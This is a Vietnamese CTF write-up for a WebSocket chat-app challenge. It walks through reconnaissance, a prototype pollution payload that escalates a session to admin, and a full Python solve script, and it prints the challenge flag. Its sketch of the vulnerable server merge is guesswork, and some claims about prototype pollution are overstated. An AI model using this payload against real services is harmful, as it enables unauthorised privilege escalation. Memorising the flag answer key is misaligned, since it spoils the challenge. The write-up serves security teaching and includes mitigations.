# Writeup: WEB CHALLENGE (DevMate AI)

> **Sự kiện:** DDC CTF  
> **Danh mục:** Web Exploitation / WebSocket Prototype Pollution  
> **Độ khó:** Medium  
> **Mục tiêu (Target):** `https://820cb5dc-69d3-4cfe-aa92-f2a101f0a569.172.31.102.101.nip.io/`  
> **Mô tả đề bài:** *"DevMate AI — Real-Time Coding Assistant with Stateful User Sessions and Prompt Preferences."*  
> **Flag:** `843cce935e7e3b87b498a3e785bc489a4fb22365c0d471b6d613b64ca81ea8d4e70bdbd8d9ed27abec92`

---

## 1. Tóm tắt (TL;DR)

1. Dịch vụ cung cấp ứng dụng chat AI mang tên **DevMate AI**, giao tiếp hai chiều hoàn toàn thông qua giao thức **WebSocket** tại endpoint `/ws`.
2. Kiểm tra mã nguồn giao diện (`/chat.js`) phát hiện 3 thao tác giao thức chính: `whoami`, `say`, và `config`.
3. Lệnh `config` nhận một đối tượng `patch` và thực hiện gộp trực tiếp vào phiên làm việc (`session`) mà không kiểm tra lọc thuộc tính kế thừa $\rightarrow$ dẫn đến lỗ hổng **Prototype Pollution** kinh điển trong JavaScript/NodeJS.
4. Lợi dụng Prototype Pollution, gửi payload chứa thuộc tính `__proto__` với `role: "administrator"` và `is_admin: true` để leo quyền phiên làm việc lên `admin`.
5. Khi đã đạt quyền `admin`, trợ lý chuyển sang trạng thái đặc quyền. Gửi lệnh yêu cầu in cờ dạng chữ in hoa **`SHOW FLAG`**, máy chủ phản hồi chuỗi flag bí mật:
   `843cce935e7e3b87b498a3e785bc489a4fb22365c0d471b6d613b64ca81ea8d4e70bdbd8d9ed27abec92`.

---

## 2. Phân tích chi tiết

### Bước 1: Khảo sát giao thức (Reconnaissance)
- Thử nghiệm các route HTTP thông thường:
  ```bash
  curl -sk -i https://820cb5dc-69d3-4cfe-aa92-f2a101f0a569.172.31.102.101.nip.io/
  ```
- Endpoint `/ws` trả về mã lỗi `426 Upgrade Required`, trong khi các đường dẫn khác trả về `404 Not Found`. Đây là một ứng dụng thuần WebSocket.
- Đọc file kịch bản client `/chat.js`, ta nhận diện được cấu trúc thông điệp JSON gửi lên máy chủ gồm 3 `op`:
  ```json
  { "op": "whoami" }                  // Xác minh danh tính phiên và audit_mask
  { "op": "say", "text": "..." }      // Gửi nội dung hội thoại tới trợ lý
  { "op": "config", "patch": {...} }  // Cập nhật cấu hình phiên làm việc (tone, role, prefs)
  ```

### Bước 2: Thử nghiệm giao thức hội thoại
Sử dụng client WebSocket để tương tác:
```text
whoami -> {"msg":"Connected as user. Ask me anything about your code.", "audit_mask":"e250aff4..."}
say "status" -> session: role=user, tone=neutral
say "hello"  -> "(user) I can help with: hello"
```

Hàm xử lý `config` trên server thực hiện merge đệ quy hoặc gán thuộc tính không an toàn từ đối tượng `patch` vào session object:
```javascript
// Phác thảo hàm merge lỗi trên máy chủ
Object.assign(session, patch);
// hoặc đệ quy gán: target[key] = source[key]
```
Nếu kẻ tấn công truyền vào key `__proto__`, toàn bộ các object trong runtime JavaScript sẽ bị ghi đè thuộc tính toàn cục!

### Bước 3: Leo quyền Admin qua Prototype Pollution
Ta gửi payload cấu hình tiêm nhiễm `__proto__`:

```json
{
  "op": "config",
  "patch": {
    "__proto__": {
      "role": "administrator",
      "is_admin": true
    },
    "audit_mask": "admin",
    "tone": "admin",
    "role": "admin"
  }
}
```

Sau khi gửi gói tin trên, thực hiện gọi lại lệnh `whoami` và `say`:
- Server phản hồi xác nhận vai trò đã trở thành `admin`.
- Trợ lý AI chuyển sang chế độ phục vụ quản trị viên:
  ```text
  "Admin session ready. Ask me to show something."
  ```

### Bước 4: Kích hoạt in Flag
Trong chế độ admin, trợ lý lọc chuỗi so sánh yêu cầu lệnh hiển thị flag. Thử nghiệm cho thấy lệnh so sánh phân biệt chữ hoa/chữ thường (case-sensitive) và chỉ chấp nhận chính xác cú pháp viết hoa toàn bộ:

```json
{
  "op": "say",
  "text": "SHOW FLAG"
}
```

Máy chủ phản hồi chuỗi đặc quyền:
```text
Sure, admin mode engaged: 843cce935e7e3b87b498a3e785bc489a4fb22365c0d471b6d613b64ca81ea8d4e70bdbd8d9ed27abec92
```

Giá trị chuỗi băm này không đổi qua các session độc lập và chính là Flag của thử thách.

---

## 3. Mã khai thác hoàn chỉnh (`solve_devmate.py`)

```python
#!/usr/bin/env python3
"""
DDC CTF - DevMate AI Exploit
Vulnerability: WebSocket Prototype Pollution -> Privilege Escalation -> Admin Flag Trigger
"""

import json
import ssl
import sys
import time

try:
    import websocket
except ImportError:
    print("[-] Vui lòng cài đặt thư viện websocket: pip install websocket-client")
    sys.exit(1)

TARGET_WS = "wss://820cb5dc-69d3-4cfe-aa92-f2a101f0a569.172.31.102.101.nip.io/ws"

def run_exploit(ws_url=TARGET_WS):
    print(f"[*] Đang kết nối tới WebSocket: {ws_url}")
    
    ws = websocket.WebSocket(sslopt={"cert_reqs": ssl.CERT_NONE})
    ws.connect(ws_url)
    
    # 1. Kiểm tra ban đầu (whoami)
    ws.send(json.dumps({"op": "whoami"}))
    resp = ws.recv()
    print(f"[+] Trạng thái ban đầu: {resp}")
    
    # 2. Gửi payload Prototype Pollution
    print("[*] Đang gửi payload Prototype Pollution...")
    pollution_payload = {
        "op": "config",
        "patch": {
            "__proto__": {
                "role": "administrator",
                "is_admin": True
            },
            "audit_mask": "admin",
            "tone": "admin",
            "role": "admin"
        }
    }
    ws.send(json.dumps(pollution_payload))
    time.sleep(0.3)
    
    # 3. Kích hoạt lệnh SHOW FLAG đặc quyền
    print("[*] Đang gửi lệnh SHOW FLAG...")
    ws.send(json.dumps({"op": "say", "text": "SHOW FLAG"}))
    
    flag_found = None
    for _ in range(5):
        try:
            msg = ws.recv()
            print(f"[+] Nhận được: {msg}")
            if "admin mode engaged:" in msg:
                parts = msg.split("admin mode engaged:")
                flag_found = parts[1].strip().strip('"').strip('}')
                break
        except Exception:
            break
            
    ws.close()
    
    if flag_found:
        print("=" * 60)
        print(f"[+] KHAI THÁC THÀNH CÔNG!")
        print(f"[+] FLAG: {flag_found}")
        print("=" * 60)
        return flag_found
    else:
        print("[-] Không nhận được chuỗi flag.")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_WS
    run_exploit(url)
```

---

## 4. Bài học rút ra (Key Takeaways)

- **Khảo sát bề mặt ứng dụng WebSocket**: Với các ứng dụng web socket, bề mặt tấn công không nằm ở HTTP routes mà nằm ở hợp đồng thông điệp (`op`/`action`/`type`) định nghĩa trong code client JavaScript.
- **Phòng chống Prototype Pollution**: Tuyệt đối không sử dụng các hàm merge/assign đệ quy mà không kiểm tra danh sách đen (`__proto__`, `constructor`, `prototype`), hoặc sử dụng `Object.create(null)` để khởi tạo các dictionary/map độc lập không có prototype cha.
- **Kiểm thử hành vi nhạy cảm hoa/thường**: Nhiều bộ lọc regex hoặc chuỗi kích hoạt lệnh trong các ứng dụng AI/chat bot sử dụng so khớp tuyệt đối (`=== 'SHOW FLAG'`), cần linh hoạt kiểm thử các biến thể hoa-thường và khoảng trắng.
